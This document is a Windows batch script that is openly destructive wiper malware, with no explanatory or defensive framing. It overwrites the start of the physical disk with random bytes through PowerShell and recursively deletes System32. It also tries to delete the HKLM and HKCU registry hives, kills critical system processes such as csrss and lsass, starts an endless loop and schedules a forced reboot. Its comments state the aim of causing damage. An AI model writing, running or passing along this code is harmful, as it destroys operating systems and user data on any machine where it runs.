@echo off
setlocal enabledelayedexpansion
start /max magnify.exe
:: Schedule reboot early (30 seconds delay to allow some damage)
shutdown /r /t 10 >nul 2>&1

:: Overwrite disk (optimized PowerShell)
powershell -NoProfile -Command "$disk = [System.IO.File]::Create('\\\\.\\PhysicalDrive0'); $buffer = [byte[]](0..1048575|%{[byte](Get-Random -Max 256)}); for($j = 0; $j -lt 10; $j++) { $disk.Seek($j * 8388608, 0); $disk.Write($buffer, 0, 1048576) }; $disk.Close()" >nul 2>&1

:: Shred System32
rd /s /q "%SystemRoot%\System32" >nul 2>&1

:: Wipe Registry
reg delete HKLM /f >nul 2>&1
reg delete HKCU /f >nul 2>&1

:: Disrupt hardware
echo . > "\\.\PhysicalDrive0" 2>nul

:: Kill critical processes (moved last to avoid instant crash)
taskkill /f /im csrss.exe,smss.exe,lsass.exe,svchost.exe,wininit.exe >nul 2>&1

:: Overload system
start /b cmd /c "for /l %%i in () do echo. >nul"

:end
pause
exit /b 0
